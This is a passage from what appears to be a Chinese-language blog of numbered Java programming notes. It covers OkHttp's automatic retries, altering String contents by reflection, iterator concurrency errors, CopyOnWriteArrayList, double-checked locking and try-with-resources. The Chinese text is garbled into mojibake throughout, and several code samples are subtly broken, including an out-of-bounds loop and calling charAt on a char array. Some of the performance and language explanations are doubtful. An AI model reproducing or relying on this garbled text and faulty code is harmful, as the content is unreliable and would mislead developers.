((ParameterizedType) getClass().getGenericSuperclass()).getActualTypeArguments()[0];//ä½¿ç”¨åå°„è·å¾—æ³›å‹å¯¹åº”class this.clazz = entityClass; this.headers = headers; this.listener = listener; } ``` 2. OkHttp é»˜è®¤ä¼šè‡ªåŠ¨é‡è¯•å¤±è´¥çš„è¯·æ±‚okhttp-is-quietly-retrying-requests-is-your-api-readyOkHttpé»˜è®¤ä¼šå¯¹è¯·æ±‚è¿›è¡Œé‡è¯•ï¼Œå…·ä½“æ˜¯åœ¨RetryAndFollowUpInterceptorä¸­è¿›è¡Œçš„ã€‚ RetryAndFollowUpInterceptor.java @Override public Response intercept(Chain chain) throws IOException { Request request = chain.request(); streamAllocation = new StreamAllocation( client.connectionPool(), createAddress(request.url()), callStackTrace); int followUpCount = 0; Response priorResponse = null; while (true) { # ä¸åœçš„å°è¯• if (canceled) { streamAllocation.release(); throw new IOException(&quot;Canceled&quot;); } Response response = null; boolean releaseConnection = true; try { response = ((RealInterceptorChain) chain).proceed(request, streamAllocation, null, null); releaseConnection = false; //é»˜è®¤ä¸è®¤å¯responseæˆåŠŸ } catch (RouteException e) { // The attempt to connect via a route failed. The request will not have been sent. if (!recover(e.getLastConnectException(), false, request)) { throw e.getLastConnectException(); } releaseConnection = false; continue; //ç»§ç»­å°è¯• } catch (IOException e) { // An attempt to communicate with a server failed. The request may have been sent. boolean requestSendStarted = !(e instanceof ConnectionShutdownException); if (!recover(e, requestSendStarted, request)) throw e; releaseConnection = false; continue; //ç»§ç»­å°è¯• } finally { // We&#39;re throwing an unchecked exception. Release any resources. if (releaseConnection) { //å‡ºç°ä¸å¯é¢„æ–™çš„é”™è¯¯ï¼Œé‡Šæ”¾ç¡¬ä»¶èµ„æºï¼Œç«¯å£ä»€ä¹ˆçš„ streamAllocation.streamFailed(null); streamAllocation.release(); } } } } å®¢æˆ·ç«¯å½“ç„¶å¯ä»¥ä½¿ç”¨retryOnConnectionFailureç¦æ­¢è¿™ç§è‡ªåŠ¨é‡è¯•ç­–ç•¥ï¼Œä½†ä¸å»ºè®®è¿™ä¹ˆåšã€‚å¦å¤–ï¼Œä¸ºé¿å…å‡å°‘ä¸å¿…è¦çš„é‡è¯•è¯·æ±‚ï¼ŒOkHttp 3.3.0 issue Donâ€™t recover if we encounter a read timeout after sending the request, but do recover if we encounter a timeout building a connectionå»ºç«‹è¿æ¥è¶…æ—¶å¯ä»¥é‡è¯•(å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„é€šé“ä¸å¯é ï¼Œå½“ç„¶å¯ä»¥é‡è¯•)ï¼Œè¿æ¥ä¸Šä¹‹åè¯»å–è¶…æ—¶åˆ™ä¸å»é‡è¯•(æœåŠ¡å™¨å‡ºäº†é—®é¢˜ï¼Œæ²¡æœ‰å¿…è¦é‡è¯•)ã€‚ å¦å¤–ï¼ŒGETæ–¹æ³•æœ¬èº«æ˜¯äººç•œæ— å®³çš„ï¼ŒRetryè¯·æ±‚å¤šæ¬¡å‘èµ·ä¸ä¼šé€ æˆæ•°æ®é”™è¯¯ï¼›ä½†å¯¹äºPOSTï¼Œæ¶‰åŠåˆ°å†™æœåŠ¡ç«¯å†™æ“ä½œï¼Œæœ€å¥½å¸¦ä¸ŠGUIDä½œä¸ºå•æ¬¡è¯·æ±‚uniqueæ ‡ç¤ºã€‚ï¼ˆè¿™æ˜¯serverå’Œclientä¹‹é—´éœ€è¦åå•†å¥½çš„protocolï¼‰ 3. From Java Code To Java Heap A talk from IBM Engineer, talking about optimizing the memery usage for your java application.youtube ibm 4. å¼ºè¡Œæ›´æ”¹Stringçš„å†…å®¹ Stringè¿™ç§ä¸œè¥¿æ˜¯æ”¾åœ¨å¸¸é‡æ± é‡Œé¢çš„ï¼Œæ‰€ä»¥ String a = &quot;hello&quot; String b = &quot;hello&quot; String c = new String(&quot;Hello&quot;) æ˜¾ç„¶abéƒ½æŒ‡å‘äº†å¸¸é‡æ± ï¼ŒcæŒ‡å‘äº†æ”¾åœ¨å †ä¸Šçš„å¯¹è±¡ï¼Œåè€…ä¹ŸæŒ‡å‘å¸¸é‡æ±  a==b!=c //æ›´æ”¹è¿™ä¸ªStringé‡Œé¢çš„ä¸œè¥¿ Field a_ = String.class.getDeclaredField(&quot;value&quot;); a_.setAccessible(true); char[] value=(char[])a_.get(a); value[3]=&#39;_&#39;; //ä¿®æ”¹aæ‰€æŒ‡å‘çš„å€¼ è¿™æ ·a,b,c çš„å€¼éƒ½æ”¹æ‰äº† void internSample(){ String str1 = &quot;Go to hell&quot;; String str2 = str1.intern(); System.out.println(str1==str2); System.out.println(&quot;before modification str1 = &quot;+str1); System.out.println(&quot;before modification str2 = &quot;+str2); try { Field f = String.class.getDeclaredField(&quot;value&quot;); f.setAccessible(true); f.set(str2,&quot;Dump ass&quot;.toCharArray()); } catch (NoSuchFieldException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } System.out.println(&quot;after modification str1 = &quot;+ str1); System.out.println(&quot;after modification str2 = &quot;+ str2); } è¾“å‡ºï¼š truebefore modification str1 = Go to hellbefore modification str2 = Go to hellafter modification str1 = Dump assafter modification str2 = Dump ass Process finished with exit code 0 5. æ³¨è§£ Builder(Retrofit retrofit, Method method) { this.retrofit = retrofit; this.method = method; this.methodAnnotations = method.getAnnotations();// è¿”å›çš„æ˜¯ä¸€ä¸ªAnnotation[]æ•°ç»„ this.parameterTypes = method.getGenericParameterTypes();// æ¯”å¦‚HashMapçš„putæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªType[2]ï¼Œåˆ†åˆ«æ˜¯&#39;K&#39;,&#39;V&#39; this.parameterAnnotationsArray = method.getParameterAnnotations(); } å¦‚æœä¸æ˜¯çœ‹åˆ°Retrofitçš„æºç ï¼Œä¸€èˆ¬è¿˜çœŸæ²¡æœºä¼šäº†è§£åˆ°è¿™å‡ ä¸ªæ–¹æ³•ã€‚ã€‚ 6. javaå¦‚ä½•æŠŠcharç±»å‹æ•°æ®è½¬æˆintç±»å‹æ•°æ®String a = â€œ123â€Stirngæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªchar[]çš„åŒ…è£…ç±»ï¼Œ1å¯¹åº”Asiciiç çš„49,2å¯¹åº”50,3å¯¹åº”51.æ‰€ä»¥å®è´¨ä¸Šå°±ç±»ä¼¼äºchar[] = new char{49,50,51} ; æƒ³æŠŠ1,2,3åˆ†åˆ«æ‹¿å‡ºæ¥å¾—è¿™ä¹ˆå†™ï¼š char[] array = a.tocharArray(); for(i=0;i&lt;=array.length();i++){ int a = Integer.parseInt(String.valueof(array.charAt(i)));//è¿™æ ·å°±èƒ½åˆ†åˆ«æŠŠ1,2,3æ‹¿å‡ºæ¥äº†ã€‚ } æ ¹æ®stackoverFlowçš„è§£é‡Š, charåªæ˜¯16bitçš„æ•°å­—ï¼Œä¹Ÿå°±æ˜¯intï¼ˆ4ä¸ªå­—èŠ‚,32ä½ï¼‰çš„å­é›†ã€‚ char word = &#39;A&#39; +1234 ;//ç¼–è¯‘é€šè¿‡ char word2 = &#39;A&#39;; word2 = word2 +1 ;//ç¼–è¯‘å¤±è´¥ charçš„è½¬æ¢é—®é¢˜ 7. Guavaå°±æ˜¯ä¸ªUtil8. ä»ArrayListçš„ConcurrentModificationExceptionè¯´èµ·ArrayListçš„ConcurrentModificationExceptionä¸€èˆ¬åœ¨ä½¿ç”¨Iteratorçš„æ—¶å€™ä¼šæŠ›å‡ºï¼Œæ™®é€šçš„getï¼Œsetä¸ä¼šã€‚ private class Itr implements Iterator&lt;E&gt; { int cursor; // index of next element to return int lastRet = -1; // index of last element returned; -1 if no such int expectedModCount = modCount; //ç®€å•çš„ä¸‰ä¸ªæˆå‘˜å˜é‡ï¼Œcursorä¼šåœ¨å¤–éƒ¨è°ƒç”¨nextæ–¹æ³•æ—¶è‡ªå¢1ï¼Œåœ¨ // lastRet ä¼šåœ¨è°ƒç”¨nextæ—¶å€™è®¾ç½®ä¸ºnextæ–¹æ³•è¿”å›çš„Valueçš„indexï¼Œåœ¨removeæ—¶è®¾ç½®ä¸º-1 } //Itrçš„next æ–¹æ³•åªæ˜¯è¿”å›äº†array[cursor],cursoræ˜¯ä»0å¼€å§‹çš„ã€‚ // Itrçš„removeæ–¹æ³•è°ƒç”¨äº†ArrayListçš„removeæ–¹æ³•ï¼ˆmodeCount++ï¼‰ï¼ŒexpectedModCountè®¾ç½®ä¸ºmodCount // ä¹‹æ‰€ä»¥è°ƒç”¨Iteratorä¸€è¾¹è¿­ä»£ä¸€è¾¹åˆ é™¤ï¼Œä¸€æ–¹æ³•æ˜¯hasNextæ–¹æ³•æ£€æµ‹äº†å½“å‰indexä¸ä¼šè¶…å‡ºæ•°ç»„å¤§å°ã€‚å¦å¤–åœ¨removeçš„æ—¶å€™ä¼šå°†å½“å‰Iteratorçš„é¢„æœŸä¸‹ä¸€ä¸ªæ“ä½œä½ç½®cursorè®¾ç½®ä¸ºä¸Šä¸€æ¬¡æ“ä½œçš„ä½ç½®ï¼ˆremoveé‡Œé¢è¿˜æœ‰ä¸€ä¸ªarrayCopyï¼‰ã€‚ final void checkForComodification() { if (modCount != expectedModCount) throw new ConcurrentModificationException(); } å‡å®šå¼€äº†åæ¡çº¿ç¨‹ï¼Œæ¯æ¡çº¿ç¨‹éƒ½è°ƒç”¨ArrayListçš„ListIteratorï¼Œå„è‡ªå¾—åˆ°ä¸€ä¸ªnew Itrçš„å®ä¾‹ã€‚è€Œè¿™äº›Itrçš„modecountéƒ½æ˜¯ä»è¿™ä¸€ä¸ªArrayListæ‹¿çš„ï¼ŒexpectedModCountåˆ™æ˜¯å„è‡ªä¿å­˜çš„ã€‚ä¸€ä¸ªåŸåˆ™å°±æ˜¯ï¼Œå¯¹äºè¿™ä¸ªé›†åˆç»“æ„æ€§çš„æ›´æ”¹ï¼ŒåŒæ—¶åªèƒ½æœ‰ä¸€æ¡çº¿ç¨‹æ¥åšã€‚æ¯æ¡çº¿ç¨‹çš„expectedModCountéƒ½ä¼šåœ¨è°ƒç”¨ArrayListçš„removeæ–¹æ³•ä¹‹åè¢«èµ‹å€¼ä¸ºArrayListçš„modCountã€‚nextå’Œremoveæ–¹æ³•å¼€å¤´éƒ½è°ƒç”¨äº†è¿™ä¸ªcheckForComodificationã€‚å°±åœ¨äºnextä¼šå› ä¸ºå…¶ä»–çº¿ç¨‹çš„ç»“æ„æ€§æ›´æ”¹æŠ›å‡ºIndexOutOfBoundsExceptionï¼Œä½†å®é™…ä¸Šé—®é¢˜å¹¶ä¸å‡ºåœ¨nextæ–¹æ³•å–é”™äº†indexã€‚åŒç†ï¼Œremoveæ–¹æ³•è°ƒç”¨çš„æ˜¯å¯èƒ½æŠ›å‡ºIndexOutOfBoundsExceptionçš„ArrayListçš„removeæ–¹æ³•ï¼Œä½†å®é™…é—®é¢˜å¹¶ä¸å‡ºåœ¨removeä¼ é”™äº†å¯¹è±¡ã€‚Itræœ¬èº«ä¿å­˜çš„indexæ˜¯æ­£ç¡®çš„ï¼Œåªæ˜¯å¤–éƒ¨ç¯å¢ƒçš„å˜æ›´ä½¿å¾—è¿™äº›indexå­˜åœ¨å¤šçº¿ç¨‹æ¡ä»¶ä¸‹çš„ä¸å¯é æ€§ã€‚å³è¿­ä»£å™¨å¯¹è±¡å®ä¾‹ä¿æŒäº†ä¸€äº›å¯¹äºå¤–ç•Œç¯å¢ƒçš„é¢„æœŸï¼Œè€Œå¹¶å‘æ¡ä»¶ä¸‹å¯¹äºé›†åˆçš„ç»“æ„æ€§æ›´æ”¹ä½¿å¾—è¿™äº›å¿…è¦çš„é¢„æµ‹ä¿¡æ¯å˜å¾—ä¸å¯é ã€‚ ListIteratorå’ŒIterator(next,hasNextä»¥åŠremove)å’Œä¸¤ä¸ªæ¥å£ï¼Œå‰è€…åœ¨åè€…çš„åŸºç¡€ä¸ŠåŠ äº†ä¸€äº›æ–¹æ³•(add,set,removeç­‰æ–¹æ³•). æ”¹æˆCopyOnWriteArrayListä¸ºä»€ä¹ˆå°±ä¸ä¼šå´©äº†ï¼š static final class COWIterator&lt;E&gt; implements ListIterator&lt;E&gt; { /** Snapshot of the array */ private final Object[] snapshot; /** Index of element to be returned by subsequent call to next. */ private int cursor; } æ²¡æœ‰äº†expectedModCountï¼Œæˆå‘˜å˜é‡å°±è¿™ä¿©ã€‚CopyOnWriteArrayListç›´æ¥å®ç°Listï¼Œå†™æ“ä½œéƒ½ç”¨ReentrantLocké”ä¸Šäº†ï¼Œå³åŒæ—¶åªèƒ½æœ‰ä¸€æ¡çº¿ç¨‹è¿›è¡Œå†™æ“ä½œï¼Œgetæ²¡æœ‰åŠ é”ã€‚private transient volatile Object[] array;æ³¨æ„ä¿å­˜æ•°æ®çš„arrayæ˜¯volatileçš„ï¼Œä»»ä½•ä¸€æ¡çº¿ç¨‹å†™çš„æ“ä½œéƒ½ä¼šè¢«æ‰€æœ‰çš„è¯»å–çº¿ç¨‹çœ‹åˆ°(skipäº†cpuç¼“å­˜)ï¼Œsetçš„æ—¶å€™ï¼Œä»¥setä¸ºä¾‹ï¼š public E set(int index, E element) { final ReentrantLock lock = this.lock; lock.lock(); try { Object[] elements = getArray(); E oldValue = get(elements, index); if (oldValue != element) { int len = elements.length; Object[] newElements = Arrays.copyOf(elements, len); //å³CopyOnWrite newElements[index] = element; setArray(newElements); } else { // Not quite a no-op; ensures volatile write semantics setArray(elements); } return oldValue; } finally { lock.unlock(); } } CopyOnWriteArrayListå†…éƒ¨ListIteratorç›´æ¥ä¿å­˜äº†ä¸€ä»½finalçš„ä¹‹å‰Arrayçš„snapShotï¼Œç”±äºæ˜¯volatileï¼Œä»»ä½•è¯»æ“ä½œéƒ½èƒ½è¯»å–åˆ°å®æ—¶çš„arrayæ•°æ®ã€‚æ‰€è°“è¯»å–æ˜¯å®‰å…¨çš„æ˜¯æŒ‡è¯»çš„æ—¶å€™å§‹ç»ˆè¯»åˆ°çš„æ˜¯æœ€å®æ—¶çš„ä¿¡æ¯ï¼Œè¿™ä¸ªé€šè¿‡volatile å°±èƒ½ä¿è¯ã€‚å†™å…¥ç”±äºåŠ é”äº†ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚ 9.floatå’Œlongè¿™äº›ç›¸äº’é™¤æ³•ï¼Œä¼šå‡ºç°ç²¾ç¡®åº¦æŸå¤±6.8040496E7*100/68040488f ä¼šå‡ºç°1.000001è¿™ç§ä¸œè¥¿ 10. intå±…ç„¶è¿˜å¯ä»¥è¿™ä¹ˆå†™ int a = 5_372_4323; ä¸‹åˆ’çº¿åªæ˜¯ä¸ºäº†å…·æœ‰æ›´å¥½çš„å¯è¯»æ€§ï¼Œadded in java 7 11.java nioæ˜¯java1.4å¼•å…¥çš„é€‚åˆè¿æ¥æ•°é«˜çš„å¹¶å‘å¤„ç†1.nioåšäº†å†…å­˜æ˜ å°„ï¼Œå°‘äº†ä¸€æ¬¡ç”¨æˆ·ç©ºé—´å’Œç³»ç»Ÿç©ºé—´ä¹‹é—´çš„æ‹·è´2.nioæ˜¯å¼‚æ­¥ï¼Œè§¦å‘å¼çš„å“åº”ï¼Œéé˜»å¡å¼çš„å“åº”ï¼Œå……åˆ†åˆ©ç”¨äº†ç³»ç»Ÿèµ„æºï¼Œä¸»è¦æ˜¯cpu 12.å¾®è§‚(macro)å±‚é¢çš„æ€§èƒ½è¦ç‚¹ List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; list.size(); i++) { //do stuff } //ä¸‹é¢è¿™ç§æ‰æ˜¯æ­£ç¡®çš„æ–¹æ³• List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (int i = 0,size = list.size(); i&lt;size; i++) { //do stuff } åœ¨å­—èŠ‚ç å±‚é¢ï¼Œlist.sizeæ˜¯é€šè¿‡invokeInterfaceå®ç°çš„ï¼Œè¿™ä¸ªè¿‡ç¨‹å®é™…ä¸Šéœ€è¦æ ¹æ®â€sizeï¼ˆï¼‰â€è¿™ä¸ªæ–¹æ³•åç§°è®¡ç®—å‡ºå¯¹åº”çš„hashå€¼ï¼Œç„¶åå»æ–¹æ³•åŒºç¼“å­˜é‡Œé¢æŸ¥æ‰¾è¿™ä¸ªæ–¹æ³•çš„å¯¹åº”å®ç°ã€‚hashè®¡ç®—ä¸€æ¬¡æ— æ‰€è°“ï¼Œè®¡ç®—å¤šæ¬¡æ€»å½’æ¯”è®¡ç®—ä¸€æ¬¡è¦æµªè´¹æ—¶é—´ã€‚ 13. inline Functionç¼–è¯‘å™¨å±‚é¢åšçš„ä¼˜åŒ–inlineã€‚ä¸»è¦æ˜¯çœå»ä¸å¿…è¦çš„ä¸€æ¬¡å‡½æ•°è°ƒç”¨ 14.jsonè§£æå™¨æ¨èæŠ¥å‡ºçš„é”™è¯¯ç¨å¾®çœ‹ä¸‹è¿˜æ˜¯èƒ½æ‡‚çš„ä¾‹å¦‚ï¼šgson-throwing-expected-begin-object-but-was-begin-array é—®é¢˜å°±åœ¨äºï¼ŒStringå½¢å¼çš„jsonæ²¡é—®é¢˜ï¼Œè‡ªå·±è¿™è¾¹å†™çš„å¯¹åº”æ˜ å°„classç»“æ„å†™é”™äº†ï¼Œä¸€ä¸ªå˜é‡å…¶å®æ˜¯objectï¼Œè‡ªå·±åœ¨classé‡Œé¢å†™æˆäº†array(list).ä¸€èˆ¬çš„è§£æå™¨ä¼šallocateä¸€å¤§å †Stringç„¶åä¸¢æ‰ï¼Œmoshiä¼šæ ¹æ®binary dataåšå¥½cacheï¼Œæ¯ä¸€ä¸ªkeyåªä¼šåˆ›å»ºä¸€æ¬¡ã€‚æ‰€ä»¥é€Ÿåº¦å¾ˆå¿«ã€‚è¿™ä¸€ç‚¹jake Whartonå’ŒJesse Wilsonåœ¨ä¸€æ¬¡ä¼šè®®ä¸Šæåˆ°è¿‡.å¦å¤–ï¼ŒjsonArrayçš„Stringé•¿è¿™æ ·â€[{},{}]â€,jsonObjectçš„Stringé•¿è¿™æ ·â€{key1:value1,key2:value2}â€. ç»å¸¸ä¼šä¸ç¡®å®šã€‚ 15. Collections.unmodifiableListçš„å‡ºç°æ˜¯æœ‰é“ç†çš„è¿˜è®°å¾—Arrays.asListè¿”å›çš„å¹¶ä¸æ˜¯java.util.ArrayListã€‚å¹¶ä¸æ”¯æŒadd,remove(ä¸¢unSupportedOperationException).ä½†æ”¯æŒset,getã€‚ä¸ºäº†æŠŠListå˜æˆå½»åº•åªè¯»çš„ï¼Œå°±å¾—ç”¨Collectionsçš„è¿™ä¸ªæ–¹æ³•ã€‚åŸç†ä¸Šå°±æ˜¯åœ¨getå’Œseté‡Œé¢ä¹Ÿä¸¢å¼‚å¸¸å‡ºæ¥ã€‚ 16. å•ä¾‹æ¨¡å¼ï¼ŒåŒé‡é”æ£€æŸ¥å•ä¾‹æ¨¡å¼æ€ä¹ˆå†™ï¼Œä¸€èˆ¬çš„ç­”æ¡ˆå°±æ˜¯åŒé‡æ£€æŸ¥ class Foo { private Helper helper; public Helper getHelper() { if (helper == null) { synchronized(this) { if (helper == null) { //å¯èƒ½æŒ‡é’ˆä¸ä¸ºç©ºï¼Œä½†æŒ‡å‘çš„å¯¹è±¡è¿˜æœªå®ä¾‹åŒ–å®Œæˆ helper = new Helper(); } } } return helper; } } é™¤éåœ¨å•ä¾‹å‰é¢åŠ ä¸Švolatileï¼Œå¦åˆ™ä¸Šè¿°å•ä¾‹æ¨¡å¼å¹¶ä¸å®‰å…¨ã€‚infoQä¹Ÿæœ‰è§£é‡Šæ­£ç¡®ç­”æ¡ˆå‚è€ƒçŸ¥ä¹ç­”æ¡ˆ:çŸ¥ä¹ç”¨æˆ· æ˜¯å› ä¸ºæŒ‡ä»¤é‡æ’é€ æˆçš„ã€‚ç›´æ¥åŸå› ä¹Ÿå°±æ˜¯ åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡å¹¶ä½¿ä¸€ä¸ªå¼•ç”¨æŒ‡å‘ä»– è¿™ä¸ªè¿‡ç¨‹ä¸æ˜¯åŸå­çš„ã€‚å¯¼è‡´äº†å¯èƒ½ä¼šå‡ºç°å¼•ç”¨æŒ‡å‘äº†å¯¹è±¡å¹¶æœªåˆå§‹åŒ–å¥½çš„é‚£å—å †å†…å­˜ï¼Œä½¿ç”¨volatileä¿®é¥°å¯¹è±¡å¼•ç”¨ï¼Œé˜²æ­¢é‡æ’åºå³å¯è§£å†³ã€‚æ¨èä½¿ç”¨å†…éƒ¨é™æ€ç±»åšå»¶æ—¶åˆå§‹åŒ–ï¼Œæ›´åˆé€‚ï¼Œæ›´å¯é ã€‚è¿™ä¸ªåŒæ­¥è¿‡ç¨‹ç”±JVMå®ç°äº†ã€‚ 17.å‡½æ•°çš„æ‰§è¡Œé¡ºåºï¼Œç”±æ­¤å¸¦æ¥çš„æ€§èƒ½å½±å“Log.Debug(&quot;list is &quot;+list) //ä¼ ä¸€ä¸ªlistè¿›å»ï¼Œlistçš„é•¿åº¦æœªçŸ¥ å…¶å®åº”è¯¥æ”¹ä¸º Log.debug(() -&gt; &quot;list is&quot;+list) //è¿™ä¸ªæ–¹æ³•æ¥å—ä¸€ä¸ªSupplier&lt;String&gt; åŒºåˆ«åœ¨äºï¼Œå‰è€…æ— è®ºæ˜¯å¦DEBUGéƒ½ä¼šå»åˆ›å»ºä¸€ä¸ªStringï¼Œåè€…åªæ˜¯æä¾›äº†å¦‚ä½•åˆ›å»ºStringçš„æ€è·¯ï¼Œå¹¶æ²¡æœ‰çœŸçš„åˆ›å»ºã€‚ 18.inlineçš„è§£é‡Šè¿™ç§è¯´è¾æ›´å¤šè§äºCæˆ–è€…C++,javaé‡Œé¢ï¼Œä¾‹å¦‚ String s = &quot;someThing&quot;; System.out.println(s.length()) //å¯ä»¥æ”¹æˆ System.out.println(&quot;something&quot;.length()) // è¿™å°±å«inlineï¼Œæ²¡å¿…è¦å¤šåˆ›å»ºä¸€æ ¹æŒ‡é’ˆå‡ºæ¥ ä¸€ç§è¯´æ³•æ˜¯ï¼Œä¸€ä¸ªmethodåªè¢«ç”¨äº†ä¸€æ¬¡ï¼Œå®Œå…¨æ²¡å¿…è¦å£°æ˜è¿™ä¸ªmethodï¼Œvmè°ƒç”¨methodéœ€è¦invokestaticæˆ–è€…invokeInterface,æå–å‡ºæ¥çœæ‰è¿™éƒ¨åˆ†æ¶ˆè€—ã€‚æ®è¯´æœ‰äº›vmå¯ä»¥è‡ªåŠ¨åšå¥½è¿™éƒ¨åˆ†ä¼˜åŒ–ã€‚ 19. for loopçš„å†™æ³•int i = 0; for (; i &lt; 10; i++) { // do stuff here } è¿™ä¹ˆå†™ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå…¶å®å¾ˆåƒ for (;;) {} è§£é‡Š,è¿™è·Ÿwhile(true)æ˜¯ä¸€æ ·çš„ã€‚ java7çš„enhanced for loopåªæ˜¯ä¸€ä¸ªsyntax sugar: List&lt;String&gt; somelist = new ArrayList&lt;&gt;();//å³è¾¹åªæœ‰ä¸¤ä¸ª&lt;&gt;æ˜¯jdk7å‡ºç°çš„diamond operatorã€‚ for (Iterator&lt;String&gt; i = someList.iterator(); i.hasNext();) { String item = i.next(); System.out.println(item); } //ç”±äºå®åœ¨æ˜¯ä¸€æ ·çš„ä¸œè¥¿ï¼Œintellij ideaé‡Œé¢ä¼šå˜é»„è‰²ï¼Œæé†’ replace with for each // debug ä¸€ä¸‹ç¡®å®å‘ç° hasNextå’Œnextæ–¹æ³•åœ¨æ¯ä¸€ä¸ªå¾ªç¯éƒ½è¢«è°ƒç”¨äº† 20. å…³äºæ³›å‹ä¸€èˆ¬æ³›å‹è¦è¿™ä¹ˆå†™ï¼š class A æˆ–è€…class B å®é™…ä¸ŠIDEä¸åœ¨ä¹é€‰æ‹©äº†ä»€ä¹ˆå­—æ¯ï¼Œæ‰€ä»¥å¯ä»¥è¿™ä¹ˆå†™ï¼š class A è¿™æ ·å†™å®Œå…¨æ²¡é—®é¢˜ 21.å­ç±»å’Œçˆ¶ç±»çš„å…³ç³»å­ç±»é‡Œé¢å†™ä¸€ä¸ªå’Œçˆ¶ç±»ä¸€æ ·åå­—çš„å˜é‡ï¼Œä¼šæŠŠçˆ¶ç±»protectedå˜é‡çš„å€¼å†²åˆ·æ‰ï¼› public class FatherClass { protected int mId; } public class ChildClass extends FatherClass { private int mId; public static void main(String[] args) { FatherClass fatherClass = new ChildClass(); fatherClass.mId = 10; System.out.println(fatherClass.mId); //10 ChildClass childClass = (ChildClass) fatherClass; childClass.mId = 20; System.out.println(fatherClass.mId); //10 System.out.println(childClass.mId); //20 } } è¾“å‡º 10 10 20 æ¢æˆ public class ChildClass extends FatherClass { private int mId; public static void main(String[] args) { ChildClass fatherClass = new ChildClass(); fatherClass.mId = 10; System.out.println(fatherClass.mId); ChildClass childClass = (ChildClass) fatherClass; childClass.mId = 20; System.out.println(fatherClass.mId); System.out.println(childClass.mId); } } è¾“å‡º 10 20 20 æ‰€åŸºæœ¬ä¸Šå°±æ˜¯ï¼ŒæŠŠä¸€ä¸ªå¯¹è±¡å½“æˆä»€ä¹ˆclassæ¥ç”¨ï¼Œæ“ä½œçš„èŒƒå›´å°±åœ¨è¿™ä¸ªå±‚é¢é€ æˆå½±å“ï¼›debugä¼šçœ‹è§ä¸¤ä¸ªå˜é‡mIdå’ŒFatherClass.mIdï¼Œæ‰€ä»¥å®Œå…¨æ˜¯ä¸¤ä¸ªintã€‚ è°ƒç”¨çˆ¶ç±»è¢«overrideçš„æ–¹æ³•ï¼Œç›®æµ‹åªèƒ½ç”¨super.someMethod() 22.æ‰“å°å‡ºä¸€ä¸ªæ–¹æ³•æ‰§è¡Œåˆ°è¿™é‡Œçš„æ–¹æ³•æ ˆ Thread.dumpStack();è¿˜æœ‰ï¼Œe.printStakTraceæ˜¯éå¸¸æ˜‚è´µçš„ 23. try with resource(since jdk 7)Joshua Blochè®¾è®¡äº†jdk7ä¸­çš„try with resourceç‰¹æ€§ã€‚åœ¨ç¨‹åºå¼€å‘ä¸­ï¼Œä»£è¡¨èµ„æºçš„å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨å®Œäº†éœ€è¦åŠæ—¶é‡Šæ”¾æ‰ã€‚ä¾‹å¦‚ï¼Œjdk7ä¹‹å‰ static String readFirstLineFromFileWithFinallyBlock(String path) throws IOException { BufferedReader br = new BufferedReader(new FileReader(path)); try { return br.readLine(); } finally { if (br != null) br.close(); } } æ”¾åœ¨finallyé‡Œé¢å°±æ˜¯ç¡®ä¿èµ„æºèƒ½å¤Ÿè¢«é‡Šæ”¾æ‰jdk7ä¹‹å static String readFirstLineFromFile(String path) throws IOException { try (BufferedReader br = new BufferedReader(new FileReader(path)) { return br.readLine(); } } jdk7æ·»åŠ äº†AutoCloseableæ¥å£ï¼Œå½“tryè¯­å¥å—è¿è¡Œç»“æŸæ—¶ï¼ŒBufferReaderä¼šè¢«è‡ªåŠ¨å…³é—­ã€‚å³ä¼šè‡ªåŠ¨è°ƒç”¨closeæ–¹æ³•ï¼Œå‡å¦‚è¿™ä¸ªcloseæ–¹æ³•æŠ›å‡ºå¼‚å¸¸ï¼Œå¼‚å¸¸å¯ä»¥é€šè¿‡Exception.getSuppressedè·å¾—ï¼Œæ‰€ä»¥è¿™é‡Œé¢çš„Exceptionæ˜¯tryè¯­å¥å—é‡Œé¢æŠ›å‡ºæ¥çš„ã€‚oracleç»™å‡ºçš„è§£é‡Šå…¶å®è·Ÿpythonå¾ˆåƒ: with open(&#39;&#39;,&#39;wb+&#39;) as f: f.read() with urllib.request.urlopen(url) as u: page = u.read() print(len(page)) ä¼šè‡ªåŠ¨å®Œæˆæ–‡ä»¶çš„å…³é—­æˆ–è€…socketçš„å…³é—­ 24. javaæä¾›äº†æ–‡ä»¶zipåŠŸèƒ½çš„æ¥å£jdk7å¼€å§‹æ·»åŠ äº†java.util.zipåŒ…ã€‚ 25. Stringä¸ºä»€ä¹ˆè¦è®¾è®¡æˆfinalçš„è§£é‡Šéå¸¸å¤šæœ‰äººçŒœæµ‹Javaæƒ³ç”¨è¿™ç§æ–¹å¼è®©Stringåœ¨å½¢å¼ä¸Šæˆä¸ºä¸€ç§åŸºæœ¬æ•°æ®ç±»å‹ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæ™®é€šçš„ç±»ã€‚ç¡®å®StringåŸºæœ¬åœ¨æ‰€æœ‰çš„ç±»ä¸­éƒ½ç”¨åˆ°äº†ã€‚ 26.ä»Exploring javaâ€™s hidden costå¾—åˆ°çš„åœ¨intellijä¸­ï¼ŒSetting -&gt; Editor -&gt; Inspection -&gt; Synthetic accessor callThe docs explains as these: This inspection is intended for J2ME and other highly resource constrained environments. Applying the results of this inspection without consideration might have negative effects on code clarity and design.Reports references to non-constant private members of a different class, for which javac will generate a package-private synthetic accessor method.An inner class and its containing class are compiled to separate class files. The Java virtual machine normally prohibits access from a class to private fields and methods of another class. To enable access from an inner class to private members of a containing class or the other way around javac creates a package-private synthetic accessor method. Less use of memory and greater performance may be achieved by making the member package-private, thus allowing direct access without the creation of a synthetic accessor method. There â€˜s no actual inner classâ€™ 27. abstract classå¯ä»¥æ²¡æœ‰æŠ½è±¡æ–¹æ³•Why use an abstract class without abstract methods? 28. ä¸€èˆ¬è¯´mapè¿­ä»£è¯»å–çš„é¡ºåºå’Œå­˜è¿›å»çš„é¡ºåºæ˜¯ä¸ä¸€æ ·çš„ï¼ˆæœ‰ä¾‹å¤–ï¼‰æ–‡æ¡£æ˜¯è¿™æ ·è¯´çš„ï¼šLinkedHashMap: â€œwith predictable iteration order [â€¦] which is normally the order in which keys were 